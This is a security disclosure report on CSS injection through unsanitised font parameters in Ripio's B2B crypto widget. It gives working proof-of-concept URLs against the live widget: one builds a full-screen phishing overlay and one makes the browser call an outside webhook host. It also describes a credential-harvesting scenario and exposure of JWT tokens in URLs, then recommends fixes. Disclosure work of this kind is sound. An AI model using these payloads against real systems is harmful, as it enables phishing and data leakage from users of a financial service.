# CSS Injection in B2B Widget Leading to Phishing and UI Manipulation

## Summary

The Ripio B2B Widget at `https://d2pneqdaei3b3x.cloudfront.net/index.html` is vulnerable to CSS Injection through unsanitized font customization parameters (`_fn`, `_fo`, `_fd`). An attacker can inject arbitrary CSS to create convincing phishing overlays, manipulate the widget's appearance, and potentially exfiltrate sensitive data displayed in the widget.

## Severity

**High** (CVSS 3.1: 7.1)

- AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N

## Vulnerability Details

### Affected Component

- **URL**: `https://d2pneqdaei3b3x.cloudfront.net/index.html`
- **Vulnerable Parameters**: `_fn` (font-name), `_fo` (font-options), `_fd` (font-default)

### Root Cause

The widget's JavaScript directly interpolates user-supplied query parameters into a `<style>` element without any sanitization:

```javascript
function getStyleInnerText() {
  const queryParams = getQueryParams();
  const fontOpts = getFontOptsFrom(queryParams); // User input: _fo
  const fontName = getFontNameFrom(queryParams); // User input: _fn
  const fontDefault = getFontDefault(queryParams); // User input: _fd

  // VULNERABLE: Direct string interpolation without sanitization
  const customFontsText = `@import url('https://fonts.googleapis.com/css2?family=${fontOpts}'); 
    body { font-family: '${fontName}', ${fontDefault};}`;

  return hasntSetCustomFont ? defaultFontsText : customFontsText;
}

function injectStyle() {
  const head = document.getElementsByTagName("head")[0];
  const style = document.createElement("style");
  style.innerText = getStyleInnerText(); // Injected into DOM
  head.appendChild(style);
}
```

### Exploitation

By injecting a payload that closes the CSS context and adds arbitrary rules:

**Payload**: `_fn=x';}*{background:red !important}/*`

**Generated CSS**:

```css
@import url('https://fonts.googleapis.com/css2?family=y');
body { font-family: 'x';}*{background:red !important}/*', sans-serif;}
```

The injected `*{background:red !important}` applies to all elements, and `/*` comments out the remaining syntax.

---

## Proof of Concept

### PoC 1: Background Color Manipulation

**URL**:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Ared%20!important%7D/*&_fo=y
```

**Result**: Entire widget background turns red.

### PoC 2: Phishing Overlay Attack

**URL**:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7Dbody%3A%3Abefore%7Bcontent%3A%27HACKED%27%3Bposition%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Ablack%3Bcolor%3Ared%3Bfont-size%3A80px%3Bdisplay%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bz-index%3A9999%7D/*&_fo=y
```

**Result**: Full-screen black overlay with "HACKED" text covering the entire widget.

### PoC 3: External Resource Loading

**URL**:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Aurl%28%27https://webhook.site/YOUR-ID%27%29%7D/*&_fo=y
```

**Result**: Browser makes request to external URL. Confirmed via webhook.site receiving the request with headers including:

- `referer: https://d2pneqdaei3b3x.cloudfront.net/`
- `sec-fetch-site: cross-site`

---

## Impact

### 1. Phishing Attacks (High)

An attacker can create a malicious link that displays a fake login form or credential harvesting page within the legitimate Ripio widget domain. Since the URL is on Ripio's CloudFront domain, users are more likely to trust the phishing content.

**Attack Scenario**:

1. Attacker crafts URL with CSS that overlays a fake login form
2. Victim (B2B partner's end-user) clicks the link
3. Victim sees legitimate Ripio domain in address bar
4. Victim enters credentials thinking it's the real widget
5. CSS-injected form sends credentials to attacker

### 2. UI Manipulation (Medium)

Attacker can:

- Hide legitimate content
- Display misleading information (fake balances, fake transaction confirmations)
- Create urgency messages ("Your account will be locked in 5 minutes")
- Redirect user attention to malicious elements

### 3. Brand Damage (Medium)

Attackers can deface the widget with offensive content, damaging Ripio's and the B2B partner's reputation.

### 4. Sensitive Data Context (Medium)

The widget handles financial operations (buy/sell crypto). Any manipulation of this interface could lead to users making incorrect financial decisions based on false information.

---

## Additional Finding: JWT Token in URL

### Description

The B2B Widget accepts JWT authentication tokens via URL query parameter `_to`:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=<JWT_TOKEN>
```

This is documented in Ripio's official integration guide.

### Security Implications

- Token persists in browser history
- Token logged in server access logs
- Token visible in proxy/CDN logs
- Token may leak to third-party analytics

### Note

Modern browsers' Referrer-Policy (`strict-origin-when-cross-origin`) prevents the full URL with token from leaking via Referer header to cross-origin destinations. However, same-origin requests or links clicked within the widget may still leak the full URL.

---

## Remediation Recommendations

### Immediate (Critical)

1. **Sanitize font parameters**: Implement strict whitelist validation

```javascript
function sanitizeFontName(input) {
  // Only allow alphanumeric, spaces, and hyphens
  return input.replace(/[^a-zA-Z0-9\s\-]/g, "");
}
```

2. **Use CSS.escape()**: For any user input placed in CSS context

```javascript
const safeFontName = CSS.escape(fontName);
```

### Short-term (High)

3. **Implement Content-Security-Policy**:

```
Content-Security-Policy: style-src 'self' https://fonts.googleapis.com; img-src 'self' data:;
```

4. **Add Referrer-Policy header**:

```
Referrer-Policy: no-referrer
```

### Long-term (Medium)

5. **Move JWT from URL**: Use POST body, secure cookies, or Authorization header
6. **Implement token binding**: Prevent cross-device/cross-origin token use

---

## Screenshots

1. **Red Background PoC**: Widget with injected red background proving CSS execution
2. **Phishing Overlay PoC**: Full-screen "HACKED" overlay demonstrating phishing capability
3. **Webhook Request**: External request triggered by CSS injection

---

## References

- Ripio Widget Documentation: https://docs.ripio.com/crypto-as-a-service/widget/buy-hold-sell-widget
- CWE-79: Improper Neutralization of Input During Web Page Generation
- CWE-94: Improper Control of Generation of Code
- OWASP CSS Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection

---

## Timeline

- **2025-12-01**: Vulnerability discovered
- **2025-12-02**: PoC developed and verified
- **2025-12-02**: Report submitted
